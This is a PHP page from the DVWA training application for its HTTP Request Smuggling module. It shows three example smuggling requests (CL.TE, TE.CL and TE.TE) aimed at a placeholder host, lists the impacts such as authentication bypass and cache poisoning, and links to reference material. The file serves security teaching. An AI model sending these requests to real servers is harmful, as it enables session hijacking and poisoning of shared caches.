<?php

define( 'DVWA_WEB_PAGE_TO_ROOT', '../../../' );
require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated' ) );

$page = dvwaPageNewGrab();
$page[ 'title' ]   = 'Vulnerability: HTTP Request Smuggling' . $page[ 'title_separator' ].$page[ 'title' ];
$page[ 'page_id' ] = 'http_smuggling';
$page[ 'help_button' ]   = 'http_smuggling';
$page[ 'source_button' ] = 'http_smuggling';

dvwaDatabaseConnect();

$vulnerabilityFile = '';
switch( dvwaSecurityLevelGet() ) {
	case 'low':
		$vulnerabilityFile = 'low.php';
		break;
	case 'medium':
		$vulnerabilityFile = 'medium.php';
		break;
	case 'high':
		$vulnerabilityFile = 'high.php';
		break;
	case 'impossible':
		$vulnerabilityFile = 'impossible.php';
		break;
	default:
		$vulnerabilityFile = 'low.php';
		break;
}

require_once DVWA_WEB_PAGE_TO_ROOT . "vulnerabilities/http_smuggling/source/{$vulnerabilityFile}";

$messagesHtml  = "<div class=\"info\">HTTP Request Smuggling exploits inconsistencies between how frontend and backend servers parse HTTP requests.</div>";
$messagesHtml .= "<div class=\"warning\">This vulnerability can lead to request routing manipulation, authentication bypass, and cache poisoning!</div>";

$page[ 'body' ] .= "
<div class=\"body_padded\">
	<h1>Vulnerability: HTTP Request Smuggling</h1>

	{$messagesHtml}

	{$smugglingHtml}

	<div style=\"margin-top: 30px; padding: 15px; background: #fff3cd; border: 1px solid #ffc107; border-radius: 5px;\">
		<h4>Attack Techniques</h4>
		
		<h5>1. CL.TE (Content-Length + Transfer-Encoding)</h5>
		<p>Frontend uses Content-Length, backend uses Transfer-Encoding:</p>
		<pre style=\"background: #f5f5f5; padding: 10px; overflow-x: auto;\">POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 6
Transfer-Encoding: chunked

0

G</pre>
		
		<h5>2. TE.CL (Transfer-Encoding + Content-Length)</h5>
		<p>Frontend uses Transfer-Encoding, backend uses Content-Length:</p>
		<pre style=\"background: #f5f5f5; padding: 10px; overflow-x: auto;\">POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

</pre>

		<h5>3. TE.TE (Double Transfer-Encoding)</h5>
		<p>Both use Transfer-Encoding but process it differently:</p>
		<pre style=\"background: #f5f5f5; padding: 10px; overflow-x: auto;\">POST / HTTP/1.1
Host: vulnerable-site.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

5
SMUGGLED
0

</pre>

		<h5>Impact:</h5>
		<ul>
			<li>🔓 Authentication bypass</li>
			<li>🌐 Cache poisoning</li>
			<li>🎯 Request routing manipulation</li>
			<li>💉 XSS injection into other users' requests</li>
			<li>🔑 Credential hijacking</li>
		</ul>
	</div>
	
	<br />
	
	<h2>More Information</h2>
	<ul>
		<li>" . dvwaExternalLinkUrlGet( 'https://portswigger.net/web-security/request-smuggling', 'PortSwigger - HTTP Request Smuggling' ) . "</li>
		<li>" . dvwaExternalLinkUrlGet( 'https://owasp.org/www-community/attacks/HTTP_Request_Smuggling', 'OWASP - HTTP Request Smuggling' ) . "</li>
		<li>" . dvwaExternalLinkUrlGet( 'https://cwe.mitre.org/data/definitions/444.html', 'CWE-444: HTTP Request Smuggling' ) . "</li>
		<li>" . dvwaExternalLinkUrlGet( 'https://www.rfcreader.com/#rfc7230', 'RFC 7230 - HTTP/1.1 Message Syntax' ) . "</li>
	</ul>
</div>
";

dvwaHtmlEcho( $page );

?>
